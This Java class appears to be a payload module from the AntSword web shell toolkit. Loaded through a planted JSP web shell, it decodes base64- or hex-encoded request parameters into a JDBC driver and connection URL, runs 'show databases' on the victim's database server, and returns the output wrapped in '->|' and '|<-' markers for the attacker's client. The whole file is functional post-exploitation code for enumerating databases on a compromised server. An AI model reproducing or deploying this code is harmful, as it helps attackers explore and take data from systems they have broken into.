import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.sql.*;

public class Show_databases {
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        ServletRequest request = page.getRequest();
        ServletResponse response = page.getResponse();
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargencode";
        String varkey2 = "antswordargconn";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + "", encoder, cs), encoder, cs);
            String z2 = EC(decode(request.getParameter(varkey2) + "", encoder, cs), encoder, cs);
            output.append(tag_s);
            sb.append(showDatabases(z1, z2));
            output.append(sb.toString());
            output.append(tag_e);
            page.getOut().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s, String encoder, String cs) throws Exception {
        if (encoder.equals("hex") || encoder == "hex")
            return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str, String encode, String cs) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encode.equals("hex") || encode == "hex") {
            if (str == "null" || str.equals("null")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encode.equals("base64") || encode == "base64") {
            byte[] bt = null;
            String version = System.getProperty("java.version");
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new  Object[]{});
                bt = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);   
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.getDeclaredConstructor().newInstance();
                bt = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
            }
            
            return new String(bt, "UTF-8");
        }
        return str;
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1] + "&characterEncoding=" + encode;
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String showDatabases(String encode, String conn) throws Exception {
        String sql = "show databases";
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }

}